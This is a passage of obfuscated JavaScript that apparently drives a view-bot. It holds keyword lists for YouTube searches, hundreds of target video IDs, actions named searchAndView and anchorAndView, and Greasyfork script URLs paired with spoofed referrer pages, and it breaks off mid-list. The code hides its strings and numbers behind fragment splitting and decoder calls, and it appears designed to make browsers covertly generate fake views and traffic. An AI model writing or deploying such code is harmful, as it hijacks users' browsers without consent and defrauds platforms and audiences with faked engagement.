searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x1cc3 + 0x2645 + 0x25e * -0x4)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x44 * 0x41 + -0x1887 + 0x74d)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0xf * 0x258 + -0x34 * 0x6b + 0x1 * -0xd69);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    T(0x14) + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    T(0x11) + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    U(0x2) + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    V(0x9, 'C!!u') + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    T(0x6) + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + V(0x18, '@j$H'),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + T(0x12) + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + U(0x19) + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + V(0x1, 'mi5u') + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + T(0x5)
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + V(0x15, '%Gfg')
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
